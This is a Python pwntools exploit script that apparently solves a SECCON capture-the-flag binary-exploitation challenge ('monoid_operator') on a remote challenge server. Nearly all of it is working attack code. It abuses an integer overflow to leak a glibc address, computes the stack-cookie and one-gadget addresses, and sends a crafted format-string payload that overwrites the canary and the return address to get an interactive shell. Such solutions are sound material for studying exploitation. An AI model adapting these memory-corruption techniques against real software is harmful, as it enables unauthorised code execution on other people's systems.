#!/usr/bin/env python3
from pwn import *


def wait_choose(p):
    if getattr(p, 'choose', False):
        setattr(p, 'choose', False)
        return
    p.recvuntil('What operator do you choose?\n')


def calc(p, op, values, count=None):
    if count is None:
        count = len(values)
    wait_choose(p)
    p.sendline(op)
    p.recvuntil('How many integers do you input?\n')
    p.sendline(str(count))
    p.recvuntil('Input integers.\n')
    p.sendline(' '.join(map(str, values)))
    setattr(p, 'choose', False)
    while True:
        line = p.recvline()
        if line.startswith(b'The answer is '):
            return int(line[14:-2])
        elif line.startswith(b'Overflow is detected.'):
            return None
        elif line.startswith(b'What operator do you choose?'):
            setattr(p, 'choose', True)


# p = process(['strace', '-o', 'strace.out', 'env', 'LD_LIBRARY_PATH=%s' % os.getcwd(), './monoid_operator'])
# p = process(['env', 'LD_LIBRARY_PATH=%s' % os.getcwd(), 'gdb', '-batch', '-x', 'gdbscript2', '--args', './monoid_operator.dbg'])
# p = process(['env', 'LD_LIBRARY_PATH=%s' % os.getcwd(), 'gdb', '-batch', '-x', 'gdbscript4', '--args', './monoid_operator.dbg'])
# p = process(['env', 'LD_LIBRARY_PATH=%s' % os.getcwd(), './ld-linux-x86-64.so', './monoid_operator'])
# open('pidfile', 'w').write(str(p.pid))
# p = process(['docker', 'run', '-i', '-v', os.getcwd() + ':' + os.getcwd(), '-w', os.getcwd(), 'monoid_operator', 'prog/monoid_operator'])
p = remote('monoidoperator.chal.seccon.jp', 27182)

assert calc(p, '+', [0xffffffffffffffff, 2] + ([0] * 128)) is None
internal_ptr = calc(p, '+', [0, 'x'], count=130)
print(f'internal_ptr = 0x{internal_ptr:x}')
glibc_ptr = internal_ptr - 0x1e4ca0
print(f'glibc_ptr =    0x{glibc_ptr:x}')
one_ptr = glibc_ptr + 0x106ef8  # [rsp+0x70] == NULL
print(f'one_ptr   =    0x{one_ptr:x}')
ldso_gap = 0x1e7000
cookie_offset = 0x5568
cookie_ptr = glibc_ptr + ldso_gap + cookie_offset  # 0x1ec568
print(f'cookie_ptr =   0x{cookie_ptr:x}')

one_ptr_bin = struct.pack('<Q', one_ptr)
assert one_ptr_bin[-1] == 0
assert one_ptr_bin[-2] == 0
assert b'\0' not in one_ptr_bin[:-2]

wait_choose(p)
p.sendline('q')
p.recvuntil('What is your name?')
p.send('prokhor')
p.recvuntil('Please write your feed back!')
z = b'%8'  # b'%6'
fmt = b''
fmt += z + b'$1032c'
fmt += z + b'$c' + b'%82$.7s'  # cookie
fmt += (z + b'$c') * 8  # rbp
fmt += one_ptr_bin[:-2] + z + b'$c' + z + b'$c'  # rip
fmt += (z + b'$c') * 112
assert b'\0' not in fmt, fmt.index(b'\0')
fmt += b'\0'
fmt += b'\xCC\xCC\xCC\xCC\xCC\xCC'
assert len(fmt) % 8 == 0, len(fmt)
fmt += struct.pack('<Q', cookie_ptr + 1)  # cookie starts with \00
fmt += b'\xCC' * (0x3ff - len(fmt))  # pad to read length
assert b'n' not in fmt
#sleep(15)
p.send(fmt)
p.interactive()
